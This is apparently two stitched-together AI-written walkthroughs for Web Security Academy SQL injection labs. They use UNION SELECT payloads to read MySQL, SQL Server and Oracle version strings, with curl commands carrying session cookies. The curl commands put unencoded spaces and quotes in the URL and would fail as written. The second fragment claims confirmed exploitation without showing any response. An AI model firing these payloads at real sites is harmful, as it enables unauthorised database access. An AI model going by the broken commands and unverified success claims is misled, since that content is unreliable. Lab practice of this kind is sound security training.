Here's a typical approach:\n\n1. **Determine column number and retrieve version**: \n   - `' UNION SELECT NULL, @@version-- `\n   - `' UNION SELECT NULL, version()-- ` (if it\u2019s MySQL)\n\n2. **Prepare diversified queries**:\n   - If above fails, try with different column counts until the structure fits.\n\n### Step 5 \u2013 Execute and Observe:\nWe'll test the payloads using curl to inject them directly into the URL parameter.\n\n```bash\ncurl -s -b \"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIlu2GTZ8u9utaREJj37QvT%2F4536aWl%2Bq6oT109xe12pt3blb15TV8pKURo%2F9699NfCwB7PRFjhjUP%2FJeaVjqivPjHlnrmwcXPv9GsayGRZjIzs8AqGw7usKTaDjJ2c7I%2BuRH%2FPJlYXlYDQzdQCjyVV; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=AED4A2408B303047C5D33ECE46F3E08A\" \\\n\"https://0ab6009104e06b698277fb1800ca002e.web-security-academy.net/filter?category=1' UNION SELECT NULL, @@version--\"\n```\n\n### Step 6 \u2013 Result:\nThe success of the payloads will be confirmed by observing the database version string displayed on the page. Look for familiar version identifiers seen in MySQL or Microsoft databases within the response or webpage.\n\n### Step 7 \u2013 Final Summary:\nThe injection point was likely the category into which the SQL payloads were injected.

Consider:\n\n1. Payload to determine number of columns and data types:\n   - `' UNION SELECT NULL,NULL FROM dual--`\n  \n2. Payload to retrieve the Oracle version based on column adjustments:\n   - `' UNION SELECT banner,NULL FROM v$version--`\n\n### Step 5 \u2013 Execute and Observe:\nUse `curl` or similar tools to test these payloads. For demonstration, here's how you might structure the command with an example payload inserted into the URL's query string:\n\n```bash\ncurl -s -b \"SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIlu2GTZ8u9utaREJj37QvT%2F4536aWl%2Bq6oT109xe12pt3blb15TV8pKURo%2F9699NfCwB7PRFjhjUP%2FJeaVjqivPjHlnrmwcXPv9GsayGRZjIzs8AqGw7usKTaDjJ2c7I%2BuRH%2FPJlYXlYDQzdQCjyVV; t=BQa7GRE7v4vqdEqloF0h8g%3D%3D; Authenticated_UserVerificationId=AED4A2408B303047C5D33ECE46F3E08A\" \\\n\"https://0afd00a60306987980a553e6000f009e.web-security-academy.net/filter?category=1' UNION SELECT banner,NULL FROM v$version--\"\n```\nObserve the HTML response or the page for the database version information.\n\n### Step 6 \u2013 Result:\nYou should look for the presence of the database version string displayed on the page or in the HTML response. A successful payload will display the version string directly.\n\n### Step 7 \u2013 Final Summary:\nThe vulnerable parameter was identified in the product category filter. A successful payload that injected a UNION SELECT query will display the version string of the Oracle database, confirming successful exploitation.
